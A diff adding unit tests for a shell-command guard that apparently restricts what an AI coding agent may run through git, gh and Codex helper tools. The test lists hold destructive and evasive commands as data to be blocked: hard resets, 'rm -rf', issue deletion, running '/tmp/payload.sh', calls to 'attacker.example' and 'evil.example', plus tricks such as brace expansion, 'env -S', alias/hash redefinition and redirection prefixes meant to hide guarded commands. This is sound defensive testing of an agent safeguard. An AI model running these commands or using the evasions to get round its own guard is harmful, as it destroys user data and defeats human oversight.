@@ -43,9 +43,89 @@ class GuardTest(unittest.TestCase):
             "git branch --contains main",
             "git branch --list 'feature/*'",
             "git remote -v",
+            "git worktree list --porcelain",
             "git worktree list --porcelain -z",
+            "git ls-remote --branches origin feature/example",
+            "git ls-remote --heads origin refs/heads/feature/example",
             "git rev-parse --abbrev-ref --symbolic-full-name '@{upstream}'",
             "git --version",
+        ):
+            with self.subTest(command=command):
+                self.assert_allowed(command)
+
+    def test_read_only_git_restricts_worktree_and_ls_remote_shapes(self):
+        for command in (
+            "git worktree list",
+            "git worktree list --porcelain --verbose",
+            "git ls-remote origin feature/example",
+            "git ls-remote --branches origin feature/example other/example",
+            "git ls-remote --branches upstream feature/example",
+            "git ls-remote --branches https://github.com/owner/repo feature/example",
+            "git ls-remote --branches origin refs/heads/feature/*",
+            "git ls-remote --branches origin main",
+            "git ls-remote --upload-pack=evil --branches origin feature/example",
+            "git ls-remote --server-option=evil --branches origin feature/example",
+        ):
+            with self.subTest(command=command):
+                self.assert_blocked(command)
+
+    def test_restricted_commands_reject_unquoted_redirection_only(self):
+        for command in (
+            "git status > /tmp/status",
+            "git status >> /tmp/status",
+            "git status 2> /tmp/status",
+            "git status &> /tmp/status",
+            "git status < /tmp/status",
+            "git status <<EOF\nignored\nEOF",
+            "git status <(printf x)",
+            "> /tmp/status git status",
+            "> /tmp/status rm -rf README.md",
+            "2>&1 git reset --hard HEAD",
+            ">! /tmp/status git reset --hard HEAD",
+            ">>! /tmp/status gh issue delete 1 --repo owner/repo",
+            "2>! /tmp/status rm -rf README.md",
+            "<<- EOF git reset --hard HEAD",
+            "2<<- EOF gh issue delete 1 --repo owner/repo",
+            "> ! git reset --hard HEAD",
+            "<< - git reset --hard HEAD",
+            "if > /tmp/status git reset --hard HEAD; then true; fi",
+            "command > /tmp/status git reset --hard HEAD",
+            "env > /tmp/status gh issue delete 1 --repo owner/repo",
+            "nice 2>&1 git reset --hard HEAD",
+            "if command > /tmp/status git reset --hard HEAD; then true; fi",
+            "timeout 1 > /tmp/status git reset --hard HEAD",
+            "nice -n 1 > /tmp/status rm -rf README.md",
+            "sudo --close-from 3 > /tmp/status git reset --hard HEAD",
+            "xargs -n 1 > /tmp/status git reset --hard HEAD",
+            "env -u 1 > /tmp/status git reset --hard HEAD",
+            "exec -a 1 > /tmp/status git reset --hard HEAD",
+            "> /tmp/status =git reset --hard HEAD",
+            "> /tmp/status g{it,} reset --hard HEAD",
+            "> /tmp/status $CMD reset --hard HEAD",
+            "if > /tmp/status =gh issue delete 1 --repo owner/repo; then true; fi",
+            "> /tmp/status python3 /home/user/.local/bin/codex-delivery deliver",
+            "> /tmp/status python3 -m cProfile /home/user/.local/bin/codex-worktree list",
+            "> /tmp/status env -Sgit reset --hard HEAD",
+            "> /tmp/status builtin eval 'git reset --hard HEAD'",
+            "gh pr view 1 > /tmp/pr",
+            "codex-delivery --help > /tmp/help",
+        ):
+            with self.subTest(command=command):
+                self.assert_blocked(command)
+        for command in (
+            r"git status \> /tmp/status",
+            "git status '>' /tmp/status",
+            'git status ">" /tmp/status',
+            "git status # a comment containing > is not redirection",
+            "printf '%s' 'git status > /tmp/status'",
+            "> /tmp/status printf '%s' git",
+            "printf '%s' git > /tmp/status",
+            "rg --files /tmp/git > /tmp/path",
+            "bash -c 'printf ok' > /tmp/status",
+            "find . -maxdepth 0 -print > /tmp/status",
+            "eval 'printf ok' > /tmp/status",
+            "timeout 1 > /tmp/status printf ok",
+            "nice -n 1 > /tmp/status printf ok",
         ):
             with self.subTest(command=command):
                 self.assert_allowed(command)
@@ -201,6 +281,26 @@ class GuardTest(unittest.TestCase):
             "git -C /workspace add -- README.md",
             "env -u TOKEN git reset --hard HEAD",
             "sudo -u root git push -u origin HEAD:refs/heads/main",
+            "sudo -D /tmp git reset --hard HEAD",
+            "sudo -U root git reset --hard HEAD",
+            "xargs --process-slot-var SLOT git reset --hard HEAD",
+            "env -a ARG0 git reset --hard HEAD",
+            "env -Sgit reset --hard HEAD",
+            "env -Sgh issue delete 1 --repo owner/repo",
+            "env -Scodex-worktree create --issue 1",
+            "env -Srm -rf README.md",
+            "command env -Sgit reset --hard HEAD",
+            "nice env -Sgh issue delete 1 --repo owner/repo",
+            "sudo -- env -Scodex-worktree create --issue 1",
+            "if command env -Sgit reset --hard HEAD; then true; fi",
+            "sudo --future-option value git reset --hard HEAD",
+            "sudo --future-option value $GIT reset --hard HEAD",
+            "/usr/libexec/git-core/git-reset --hard HEAD",
+            "git-clean -fd",
+            "git-push origin :main",
+            "env git-reset --hard HEAD",
+            "if git-reset --hard HEAD; then true; fi",
+            "bash -c 'git-clean -fd'",
             "exec rm README.md",
             "nice rm README.md",
             "timeout 1 rm README.md",
@@ -209,8 +309,27 @@ class GuardTest(unittest.TestCase):
             "find . -exec rm README.md ;",
             "x=rm; \"$x\" README.md",
             "sh -c 'x=rm; \"$x\" README.md'",
+            "bash -c '{git,reset} --hard HEAD'",
+            "bash -c '{gh,issue,delete} 1 --repo attacker/repo'",
+            "bash -c '{rm,-rf} README.md'",
+            "g{it,} status",
+            "g* status",
+            "=git reset --hard HEAD",
+            "=gh issue delete 1 --repo owner/repo",
+            "=codex-delivery deliver",
+            "=rm -rf README.md",
+            "~gitcmd reset --hard HEAD",
+            "~ghcmd issue delete 1 --repo owner/repo",
+            "~rmcmd -rf README.md",
+            "g\\\nit reset --hard HEAD",
+            "g\\\nh issue delete 1 --repo owner/repo",
+            "r\\\nm -rf README.md",
+            "bash -c 'g\\\nit reset --hard HEAD'",
             "x=gh; \"$x\" issue comment 9 --repo attacker/repo",
             "eval 'rm README.md'",
+            "builtin eval 'git reset --hard HEAD'",
+            "builtin source /tmp/payload.sh",
+            "builtin . /tmp/payload.sh",
             "printf 'rm README.md\\n' | bash",
             "bash /tmp/payload.sh",
             "bash --norc /tmp/payload.sh",
@@ -226,10 +345,31 @@ class GuardTest(unittest.TestCase):
         for command in (
             "rg --files /tmp/example/git",
             "printf '%s' /usr/bin/git",
+            "printf '%s' /usr/libexec/git-core/git-reset",
+            "printf '%s' env -Sgit",
+            "python3 tool.py env -Sgit",
             "python3 tool.py --path /usr/bin/git",
+            "command -v codex-delivery",
+            "command -V codex-worktree",
+            "rg --files /home/daiki/.local/bin/codex-delivery",
+            "python3 tool.py --path /usr/bin/codex-delivery",
         ):
             with self.subTest(command=command):
                 self.assert_allowed(command)
+
+        for command in (
+            "python3 /home/user/.local/bin/codex-delivery deliver",
+            "env python3 /home/user/.local/bin/codex-worktree list",
+            "python3 -m codex-delivery deliver",
+            "python3 -B -m codex-delivery deliver",
+            "python3 -X dev -m codex-worktree list",
+            "python3 -B -m runpy /home/user/.local/bin/codex-delivery",
+            "python3 -B -m cProfile /home/user/.local/bin/codex-delivery deliver",
+            "python3 -B -m trace --trace /home/user/.local/bin/codex-worktree create --issue 1",
+            "python3 -m pdb /home/user/.local/bin/codex-delivery deliver",
+        ):
+            with self.subTest(command=command):
+                self.assert_blocked(command)
 
     def test_git_and_gh_require_canonical_executables(self):
         for command in (
@@ -244,6 +384,8 @@ class GuardTest(unittest.TestCase):
     def test_worktree_helper_accepts_only_canonical_operations(self):
         for command in (
             "codex-worktree --help",
+            "codex-worktree list --help",
+            "codex-worktree doctor -h",
             "codex-worktree list",
             "codex-worktree doctor",
             "codex-worktree doctor --task-id issue-22",
@@ -272,6 +414,9 @@ class GuardTest(unittest.TestCase):
             "codex-worktree create --issue 22 && git status",
             "codex-worktree recover --task-id issue-22 && git status",
             "bash -lc 'codex-worktree create --issue 22'",
+            "codex-worktree list --help --all",
+            "codex-worktree doctor --help --task-id issue-22",
+            "codex-worktree remove --help",
         ):
             with self.subTest(command=command):
                 self.assert_blocked(command, "/workspace")
@@ -283,6 +428,10 @@ class GuardTest(unittest.TestCase):
         )
         for command in (
             "codex-delivery --help",
+            "codex-delivery record-review --help",
+            "codex-delivery approve-review -h",
+            "codex-delivery deliver --help",
+            "codex-delivery finish -h",
             f"codex-delivery record-review --task-id issue-24 --pr 27 --head {head} "
             "--risk medium --plan-id CODEX-COMPLETE-DELIVERY-20260819-v1 " + evidence,
             f"codex-delivery record-review --task-id issue-24 --pr 27 --head {head} "
@@ -331,9 +480,24 @@ class GuardTest(unittest.TestCase):
             "--plan-id CODEX-COMPLETE-DELIVERY-20260819-v1 && git status",
             f"bash -lc 'codex-delivery finish --task-id issue-24 --pr 27 --head {head} "
             "--plan-id CODEX-COMPLETE-DELIVERY-20260819-v1'",
+            "codex-delivery record-review --help --task-id issue-24",
+            "codex-delivery inspect --help",
         ):
             with self.subTest(command=command):
                 self.assert_blocked(command, "/workspace")
+
+    def test_canonical_helper_help_does_not_require_repository_context(self):
+        for command in (
+            "codex-worktree create --help",
+            "codex-worktree recover -h",
+            "codex-delivery record-review --help",
+            "codex-delivery deliver -h",
+        ):
+            with self.subTest(command=command):
+                tokens = next(GUARD._command_segments(command))
+                self.assertFalse(GUARD._has_write_operation(tokens))
+                self.assertIsNone(GUARD._write_context_reason(command, "/tmp"))
+                self.assert_allowed(command, "/tmp")
 
     def test_direct_ready_is_blocked_but_return_to_draft_is_allowed(self):
         with mock.patch.object(GUARD, "_origin_repository", return_value="owner/repo"):
@@ -526,6 +690,8 @@ class GuardTest(unittest.TestCase):
             "gh api https://attacker.example/user",
             "gh api //attacker.example/user",
             "gh api /user -H 'Authorization: Bearer $GH_TOKEN'",
+            "gh api --cache 1h /user",
+            "gh api --cache=1h /user",
         ):
             with self.subTest(command=command):
                 self.assert_blocked(command, "/workspace")
@@ -542,6 +708,7 @@ class GuardTest(unittest.TestCase):
             "gh pr reopen 25 --repo owner/repo",
             "gh pr update-branch 25 --repo owner/repo",
             "gh api repos/owner/repo -X PATCH -f name=test",
+            "gh api --cache 1h /user",
         ):
             with self.subTest(command=command):
                 tokens = next(GUARD._command_segments(command))
@@ -613,6 +780,378 @@ class GuardTest(unittest.TestCase):
                     "gh issue comment 9 --repo owner/repo --body-file " + body.name,
                     "/workspace",
                 )
+
+    def test_issue_comment_inline_body_has_dedicated_body_file_diagnostic(self):
+        for option in ("-b", "--body", "--body=inline", "-binline"):
+            with self.subTest(option=option):
+                reason = GUARD.blocked_reason(
+                    f"gh issue comment 9 --repo owner/repo {option} inline",
+                    "/workspace",
+                )
+                self.assertIsNotNone(reason)
+                self.assertIn("--body-file", reason)
+
+    def test_direct_gh_graphql_is_always_blocked(self):
+        for query in (
+            "query { viewer { login } }",
+            "mutation { deleteIssue(input: {}) { clientMutationId } }",
+            "subscription { events { id } }",
+            "query Q { viewer { login } } mutation M { x }",
+        ):
+            command = "gh api graphql -f query=" + query
+            with self.subTest(query=query):
+                self.assert_blocked(command, "/workspace")
+        self.assert_blocked("gh api --method GET graphql", "/workspace")
+        for endpoint in (
+            "/graphql",
+            "graphql/",
+            "GraphQL#fragment",
+            "graphql?query=query%20%7Bviewer%7Blogin%7D%7D",
+            "/graphql/?query=query%20%7Bviewer%7Blogin%7D%7D",
+            "%67raphql?query=query%20%7Bviewer%7Blogin%7D%7D",
+            "foo/../graphql",
+            "graphql%2f",
+            "foo/%2e%2e/%2567raphql",
+            "graphql%",
+        ):
+            with self.subTest(endpoint=endpoint):
+                self.assert_blocked(f"gh api '{endpoint}'", "/workspace")
+        for command in (
+            "gh api --preview corsair graphql",
+            "gh api -p corsair graphql",
+            "gh api -q . graphql",
+            "gh api -t '{{.}}' graphql",
+            "gh api --template '{{.}}' graphql",
+        ):
+            with self.subTest(command=command):
+                self.assert_blocked(command, "/workspace")
+
+    def test_run_cancel_requires_exact_shape_and_rest_readback(self):
+        payload = {
+            "id": 123,
+            "repository": {"full_name": "OWNER/repo"},
+            "status": "queued",
+            "conclusion": None,
+            "cancel_url": "https://api.github.com/repos/owner/repo/actions/runs/123/cancel",
+        }
+        with (
+            mock.patch.object(GUARD, "_origin_repository", return_value="owner/repo"),
+            mock.patch.object(GUARD, "_gh_transport_reason", return_value=None),
+            mock.patch.object(GUARD, "_run_gh_json", return_value=payload) as run_json,
+        ):
+            self.assert_allowed(
+                "gh run cancel 123 --repo OWNER/repo", "/workspace"
+            )
+            run_json.assert_called_once_with(
+                "/workspace",
+                "api", "--method", "GET",
+                "repos/OWNER/repo/actions/runs/123",
+            )
+        for command in (
+            "gh run cancel",
+            "gh run cancel -1 --repo owner/repo",
+            "gh run cancel abc --repo owner/repo",
+            "gh run cancel 123 124 --repo owner/repo",
+            "gh run cancel 123 --repo owner/repo --repo owner/repo",
+            "gh run cancel 123 --repo owner/repo --force",
+            "gh run cancel 123 -R owner/repo",
+            "gh run cancel 123 --repo=owner/repo",
+            "gh run cancel --repo owner/repo 123",
+            "gh run cancel 123 --verbose --repo owner/repo",
+            "gh run cancel https://github.com/owner/repo/actions/runs/123 --repo owner/repo",
+            "gh run cancel 0 --repo owner/repo",
+            "gh run cancel 0123 --repo owner/repo",
+            "gh run cancel 123 --repo attacker/repo",
+            "gh run cancel 123 --repo github.com/owner/repo",
+            "gh run cancel --help",
+            "gh run cancel 123 --repo owner/repo && gh run view 123",
+            "gh run cancel 123 --repo owner/repo;",
+            "gh run cancel 123 --repo owner/repo &",
+            "(gh run cancel 123 --repo owner/repo)",
+            "gh run cancel $RUN_ID --repo owner/repo",
+            "gh run cancel 123 --repo owner/repo > /tmp/cancel",
+            "gh run cancel 123 --repo owner/repo | tee /tmp/cancel",
+            "gh run delete 123 --repo owner/repo",
+            "gh run rerun 123 --repo owner/repo",
+            "gh workflow run ci.yml --repo owner/repo",
+            "gh api --method POST repos/owner/repo/actions/runs/123/cancel",
+        ):
+            with self.subTest(command=command):
+                self.assert_blocked(command, "/workspace")
+
+        with (
+            mock.patch.dict(GUARD.os.environ, {"GH_REPO": "owner/repo"}),
+            mock.patch.object(GUARD, "_origin_repository", return_value="owner/repo"),
+        ):
+            self.assert_blocked(
+                "gh run cancel 123 --repo owner/repo", "/workspace"
+            )
+        with mock.patch.dict(GUARD.os.environ, {"GH_HOST": "example.com"}):
+            self.assert_blocked(
+                "gh run cancel 123 --repo owner/repo", "/workspace"
+            )
+
+    def test_run_cancel_rest_readback_fails_closed(self):
+        command = "gh run cancel 123 --repo owner/repo"
+        valid = {
+            "id": 123,
+            "repository": {"full_name": "owner/repo"},
+            "status": "in_progress",
+            "conclusion": None,
+            "cancel_url": "https://api.github.com/repos/owner/repo/actions/runs/123/cancel",
+        }
+        with (
+            mock.patch.object(GUARD, "_origin_repository", return_value="owner/repo"),
+            mock.patch.object(GUARD, "_gh_transport_reason", return_value=None),
+        ):
+            for override in (
+                None,
+                {"id": True},
+                {"id": "123"},
+                {"id": 124},
+                {"repository": None},
+                {"repository": {"full_name": "attacker/repo"}},
+                {"repository": {"full_name": 123}},
+                {"status": ["queued"]},
+                {"conclusion": ""},
+                {"cancel_url": "https://api.github.com/repos/owner/repo/actions/runs/124/cancel"},
+                {"cancel_url": "https://api.github.com/repos/attacker/repo/actions/runs/123/cancel"},
+                {"cancel_url": "https://api.github.com/repos/owner/repo/actions/runs/123/cancel?x=1"},
+                {"cancel_url": "https://github.com/owner/repo/actions/runs/123/cancel"},
+            ):
+                payload = None if override is None else valid | override
+                with (
+                    self.subTest(override=override),
+                    mock.patch.object(GUARD, "_run_gh_json", return_value=payload),
+                ):
+                    self.assert_blocked(command, "/workspace")
+            for status in (
+                "completed", "cancelled", "success", "failure", "waiting",
+                "requested", "pending", "unknown",
+            ):
+                with (
+                    self.subTest(status=status),
+                    mock.patch.object(
+                        GUARD, "_run_gh_json", return_value=valid | {"status": status}
+                    ),
+                ):
+                    self.assert_blocked(command, "/workspace")
+            missing_conclusion = dict(valid)
+            missing_conclusion.pop("conclusion")
+            with mock.patch.object(
+                GUARD, "_run_gh_json", return_value=missing_conclusion
+            ):
+                self.assert_blocked(command, "/workspace")
+            with mock.patch.object(GUARD, "_run_gh_json", return_value=valid):
+                self.assert_allowed(command, "/workspace")
+                tokens = next(GUARD._command_segments(command))
+                self.assertTrue(GUARD._has_write_operation(tokens))
+
+    def test_run_gh_json_uses_bounded_read(self):
+        with mock.patch.object(
+            GUARD, "_run_gh_bytes", return_value=(0, b'{"ok": true}')
+        ) as run:
+            self.assertEqual(
+                GUARD._run_gh_json("/workspace", "api", "--method", "GET", "/user"),
+                {"ok": True},
+            )
+        run.assert_called_once_with(
+            "/workspace", "api", "--method", "GET", "/user"
+        )
+
+    def test_run_gh_bytes_disables_prompt_and_stdin(self):
+        read_fd, write_fd = os.pipe()
+        os.write(write_fd, b'{"ok": true}')
+        os.close(write_fd)
+        stream = os.fdopen(read_fd, "rb")
+        process = mock.Mock(stdout=stream)
+        process.poll.return_value = 0
+        process.wait.return_value = 0
+        with mock.patch.object(GUARD.subprocess, "Popen", return_value=process) as popen:
+            self.assertEqual(
+                GUARD._run_gh_bytes(
+                    "/workspace", "api", "--method", "GET", "/user"
+                ),
+                (0, b'{"ok": true}'),
+            )
+        stream.close()
+        kwargs = popen.call_args.kwargs
+        self.assertIs(kwargs["stdin"], GUARD.subprocess.DEVNULL)
+        self.assertEqual(kwargs["env"]["GH_PROMPT_DISABLED"], "1")
+
+    def test_run_gh_bytes_stops_at_output_cap(self):
+        read_fd, write_fd = os.pipe()
+        os.write(write_fd, b"12345")
+        os.close(write_fd)
+        stream = os.fdopen(read_fd, "rb")
+        process = mock.Mock(stdout=stream)
+        process.poll.return_value = None
+        process.wait.return_value = 0
+        process.kill.side_effect = ProcessLookupError
+        selector = mock.Mock()
+        selector.select.return_value = [(None, None)]
+        selector.close.side_effect = OSError
+        with (
+            mock.patch.object(GUARD, "MAX_BODY_FILE_BYTES", 4),
+            mock.patch.object(GUARD.subprocess, "Popen", return_value=process),
+            mock.patch.object(GUARD.selectors, "DefaultSelector", return_value=selector),
+        ):
+            self.assertIsNone(GUARD._run_gh_bytes("/workspace", "api", "/user"))
+        stream.close()
+        process.kill.assert_called_once_with()
+        process.wait.assert_called()
+        selector.close.assert_called_once_with()
+
+    def test_run_cancel_rejects_unsafe_github_transport(self):
+        command = "gh run cancel 123 --repo owner/repo"
+        with mock.patch.object(GUARD, "_origin_repository", return_value="owner/repo"):
+            for key in ("GH_CONFIG_DIR", "HTTPS_PROXY", "SSL_CERT_FILE"):
+                with (
+                    self.subTest(key=key),
+                    mock.patch.dict(GUARD.os.environ, {key: "/tmp/untrusted"}),
+                ):
+                    self.assert_blocked(command, "/workspace")
+
+    def test_gh_transport_rejects_unix_socket_and_fails_closed(self):
+        configured = (0, b"/tmp/gh.sock\n")
+        safe = (0, b"")
+        failed = (2, b"")
+        injected = (0, b"\nfoo=bar\n")
+        whitespace = (0, b" \t\n")
+        carriage_return = (0, b"\r\n")
+        extra_line = (0, b"\n\n")
+        vertical_tab = (0, b"\x0b\n")
+        with (
+            mock.patch.dict(GUARD.os.environ, {}, clear=True),
+            mock.patch.object(
+                GUARD,
+                "_run_gh_bytes",
+                side_effect=(
+                    configured, safe, failed, injected, whitespace,
+                    carriage_return, extra_line, vertical_tab,
+                ),
+            ) as run,
+        ):
+            self.assertIsNotNone(GUARD._gh_transport_reason("/workspace"))
+            self.assertIsNone(GUARD._gh_transport_reason("/workspace"))
+            self.assertIsNotNone(GUARD._gh_transport_reason("/workspace"))
+            self.assertIsNotNone(GUARD._gh_transport_reason("/workspace"))
+            self.assertIsNotNone(GUARD._gh_transport_reason("/workspace"))
+            self.assertIsNotNone(GUARD._gh_transport_reason("/workspace"))
+            self.assertIsNotNone(GUARD._gh_transport_reason("/workspace"))
+            self.assertIsNotNone(GUARD._gh_transport_reason("/workspace"))
+        args, kwargs = run.call_args_list[0]
+        self.assertEqual(
+            args[0],
+            "/workspace",
+        )
+        self.assertEqual(
+            args[1:],
+            ("config", "get", "http_unix_socket", "--host", "github.com"),
+        )
+
+    def test_restricted_commands_reject_prior_shell_context_mutation(self):
+        for command in (
+            "export GIT_CONFIG_GLOBAL=/tmp/evil && git status",
+            "export GIT_SSH_COMMAND=/tmp/evil && git ls-remote --branches origin refs/heads/feature/example",
+            "export GH_HOST=evil.example && gh pr view 1",
+            "GIT_CONFIG_GLOBAL=/tmp/evil && git status",
+            "cd /tmp/other-repository && git status",
+            "pushd /tmp/other-repository && git log --all",
+            "eval 'export GH_HOST=evil.example' && gh pr view 1",
+            "eval 'export GIT_CONFIG_GLOBAL=/tmp/evil' && git status",
+            "eval 'cd /tmp/other-repository' && git status",
+            "alias x=git; eval 'x reset --hard HEAD'",
+            "alias x=gh; eval 'x issue delete 1 --repo owner/repo'",
+            "hash x=/usr/bin/git; x reset --hard HEAD",
+            "function x { printf ok; }; x; git status",
+            "if hash x=/usr/bin/git; then x reset --hard HEAD; fi",
+            "if hash x=/usr/bin/gh; then x issue delete 1 --repo owner/repo; fi",
+            "if alias x=git; then x reset --hard HEAD; fi",
+            "builtin hash x=/usr/bin/git; x reset --hard HEAD",
+            "if builtin hash x=/usr/bin/git; then x reset --hard HEAD; fi",
+            "hash git=/bin/echo; git status",
+            "chdir /tmp/other-repository && git status",
+            "autoload -Uz helper; git status",
+            "readonly GIT_CONFIG_GLOBAL=/tmp/evil; git status",
+            "integer GIT_CONFIG_COUNT=1; git status",
+        ):
+            with self.subTest(command=command):
+                self.assert_blocked(command, "/workspace")
+
+    def test_shell_compound_forms_cannot_hide_guarded_commands(self):
+        for command in (
+            "if gh pr close 1 --repo owner/repo; then true; fi",
+            "if git add -- README.md; then true; fi",
+            "time git add -- README.md",
+            "! gh pr close 1 --repo owner/repo",
+            "for x in 1; do codex-worktree create --issue 1; done",
+            "{ git status; } > /tmp/status",
+            "if cd /tmp/other-repository; then true; fi; git status",
+            "if export GIT_CONFIG_GLOBAL=/tmp/evil; then true; fi; git status",
+            "for x in /tmp/other-repository; do cd \"$x\"; done; git status",
+            "f(){ cd /tmp/other-repository; }; f; git status",
+            "if noglob git add -- README.md; then true; fi",
+            "if time git reset --hard HEAD; then true; fi",
+            "if ! gh pr close 1 --repo attacker/repo; then true; fi",
+            "while noglob codex-worktree create --issue 1; do true; done",
+            "repeat 1 git reset --hard HEAD",
+            "nocorrect git reset --hard HEAD",
+            "if nocorrect gh issue delete 1 --repo attacker/repo; then true; fi",
+            "repeat 1 codex-worktree create --issue 1",
+            "if time -p gh pr close 1 --repo owner/repo; then true; fi",
+            "coproc gh pr close 1 --repo owner/repo",
+            "coproc MYJOB git reset --hard HEAD",
+            "function f { git reset --hard HEAD; }; f",
+            "function f { gh issue delete 1 --repo owner/repo; }; f",
+            "- git reset --hard HEAD",
+            "if sudo --close-from 3 git add -- README.md; then true; fi",
+            "if sudo --close-from 3 gh pr close 1 --repo owner/repo; then true; fi",
+            "if sudo --close-from 3 codex-worktree create --issue 1; then true; fi",
+            "if sudo --future-option value git add -- README.md; then true; fi",
+            "if $GIT add -- README.md; then true; fi",
+            "if ${GIT} add -- README.md; then true; fi",
+            "if g* add -- README.md; then true; fi",
+            "if =git reset --hard HEAD; then true; fi",
+            "if ~gitcmd reset --hard HEAD; then true; fi",
+            "if g\\\nit reset --hard HEAD; then true; fi",
+            "if env -S 'git reset --hard HEAD'; then true; fi",
+            "if env --split-string 'git add -- README.md'; then true; fi",
+            "if env -S \"$CMD\"; then true; fi",
+            "time env -Sgh issue delete 1 --repo owner/repo",
+            "function f { env -Sgit reset --hard HEAD; }; f",
+        ):
+            with self.subTest(command=command):
+                self.assert_blocked(command, "/workspace")
+        for command in (
+            "if command -v codex-delivery; then true; fi",
+            "if echo git; then true; fi",
+            "if echo codex-delivery; then true; fi",
+            "if rg --files /tmp/codex-delivery; then true; fi",
+            "repeat 1 echo git",
+            "printf '%s' 'g\\\nit reset --hard HEAD'",
+        ):
+            with self.subTest(command=command):
+                self.assert_allowed(command)
+
+    def test_restricted_commands_reject_unquoted_shell_expansion(self):
+        for command in (
+            "git diff ${:---output=/tmp/hook-bypass}",
+            "git diff $GIT_DIFF_ARGS",
+            "git diff \"$GIT_DIFF_ARGS\"",
+            "git diff {--stat,--output=/tmp/hook-bypass}",
+            "git diff *",
+            "git branch --list feature/?",
+        ):
+            with self.subTest(command=command):
+                self.assert_blocked(command, "/workspace")
+        for command in (
+            "git branch --list 'feature/*'",
+            "git diff -- '*'",
+            r"git diff \*",
+        ):
+            with self.subTest(command=command):
+                self.assert_allowed(command, "/workspace")
 
     def test_push_preflight_rejects_pushurl_and_dirty_worktree(self):
         with mock.patch.object(
@@ -1203,6 +1742,44 @@ class GuardTest(unittest.TestCase):
             )
         resolve_target.assert_called_once_with("/workspace", target)
         branch.assert_called_once_with(target)
+
+    def test_git_dash_c_read_targets_only_the_registered_worktree(self):
+        with tempfile.TemporaryDirectory(prefix="guard-read-worktree-") as directory:
+            root = Path(directory)
+            repository = root / "repository"
+            linked = root / "linked"
+            other = root / "other"
+            repository.mkdir()
+            linked.mkdir()
+            other.mkdir()
+            common = repository / ".git"
+
+            def resolved(cwd, argument):
+                if argument == "--git-common-dir":
+                    return common
+                return repository if Path(cwd) == repository else Path(cwd)
+
+            with (
+                mock.patch.object(GUARD, "_resolved_git_path", side_effect=resolved),
+                mock.patch.object(GUARD, "_managed_worktree_reason", return_value=None),
+            ):
+                self.assert_allowed(f"git -C {linked} status", str(repository))
+                self.assert_allowed(f"git -C {linked} status", str(linked))
+
+            for command, cwd in (
+                (f"git -C {repository} status", str(repository)),
+                (f"git -C {other} status", str(linked)),
+                (f"git -C {linked} --no-pager status", str(repository)),
+                (f"git -C {linked} --show-toplevel", str(repository)),
+                ("git -C relative status", str(repository)),
+                (f"git -C {linked} -C {other} status", str(repository)),
+            ):
+                with self.subTest(command=command, cwd=cwd):
+                    with (
+                        mock.patch.object(GUARD, "_resolved_git_path", side_effect=resolved),
+                        mock.patch.object(GUARD, "_managed_worktree_reason", return_value=None),
+                    ):
+                        self.assert_blocked(command, cwd)
 
     def test_hook_uses_official_session_cwd_not_tool_workdir(self):
         stdout = io.StringIO()
